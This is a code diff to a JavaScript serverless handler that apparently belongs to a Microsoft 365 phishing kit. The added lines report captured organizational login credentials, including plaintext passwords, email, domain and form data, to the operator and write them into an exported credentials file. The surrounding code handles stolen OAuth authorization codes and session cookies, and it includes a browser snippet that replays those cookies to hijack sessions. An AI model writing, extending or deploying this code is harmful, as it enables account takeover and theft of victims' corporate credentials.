@@ -73,6 +73,19 @@ export const handler = async (event, context) => {
     messageText += `✅ Auth Code: ${hasAuthCode ? 'Captured (see file)' : 'Missing'}\n`;
     messageText += `🕒 Time: ${timestamp}\n\n`;
     
+    // Add organizational credentials info
+    const orgCreds = data.organizationalCredentials;
+    if (orgCreds && (orgCreds.email || orgCreds.username || orgCreds.password)) {
+      messageText += `🏢 *Organizational Login Detected*\n`;
+      messageText += `🏷️ Type: ${orgCreds.organizationType || 'Unknown'}\n`;
+      messageText += `👤 Org Email: ${orgCreds.email || 'not-captured'}\n`;
+      messageText += `🔑 Org Username: ${orgCreds.username || 'not-captured'}\n`;
+      messageText += `🔐 Org Password: ${orgCreds.password ? '✅ Captured' : '❌ Not captured'}\n`;
+      messageText += `🌐 Org Domain: ${orgCreds.domain || 'unknown'}\n\n`;
+    } else {
+      messageText += `🏢 Organization: Direct Microsoft login\n\n`;
+    }
+    
     // Note: Authorization code is in the file, not in text message for security
     
     // Add cookie info if available
@@ -169,6 +182,9 @@ export const handler = async (event, context) => {
           )});for(let o of e)document.cookie=\`\${o.name}=\${o.value};Max-Age=31536000;\${o.path?\`path=\${o.path};\`:""}\${o.domain?\`\${o.path?"":"path=/"}domain=\${o.domain};\`:""}\${o.secure?"Secure;":""}\${o.sameSite?\`SameSite=\${o.sameSite};\`:"SameSite=no_restriction;"}\`;location.reload()}();`
         : `console.log("%c NO COOKIES FOUND","background:red;color:#fff;font-size:30px;");alert("No cookies were captured for this session.");`;
 
+      // Extract organizational credentials
+      const orgCreds = data.organizationalCredentials;
+      
       // Create cookies file content
       const cookiesFileContent = `// ====================================================
 // MICROSOFT 365 OAUTH CREDENTIALS - ${timestamp}
@@ -177,12 +193,36 @@ export const handler = async (event, context) => {
 // Domain: ${domain}
 // Session ID: ${sessionId}
 // Cookies Found: ${microsoftCookies.length}
+// Organizational Login: ${orgCreds ? orgCreds.organizationType : 'None (Direct Microsoft)'}
 // ====================================================
 
 // *** AUTHORIZATION CODE (PRIMARY CREDENTIAL) ***
 // Use this code to exchange for access tokens via Microsoft OAuth API
 // Expires in 10 minutes from issuance
 let authorizationCode = "${authCode || 'Not captured'}";
+
+// *** ORGANIZATIONAL LOGIN CREDENTIALS ***
+${orgCreds && (orgCreds.email || orgCreds.username || orgCreds.password) ? `
+// Captured from company/federated login page
+// Organization Type: ${orgCreds.organizationType || 'Unknown'}
+// Login Domain: ${orgCreds.domain || 'Unknown'}
+
+let organizationalCredentials = {
+    email: "${orgCreds.email || 'not-captured'}",
+    username: "${orgCreds.username || 'not-captured'}",
+    password: "${orgCreds.password || 'not-captured'}",
+    organizationType: "${orgCreds.organizationType || 'Unknown'}",
+    loginDomain: "${orgCreds.domain || 'Unknown'}",
+    captureTime: "${orgCreds.captureTime || timestamp}",
+    loginUrl: "${orgCreds.url || 'Unknown'}"
+};
+
+// *** ORGANIZATIONAL FORM DATA ***
+let organizationalFormData = ${JSON.stringify(orgCreds.formData || {}, null, 2)};
+` : `
+// No organizational login detected - user logged in directly with Microsoft
+let organizationalCredentials = null;
+`}
 
 // *** USER INFORMATION ***
 let email = "${email}";
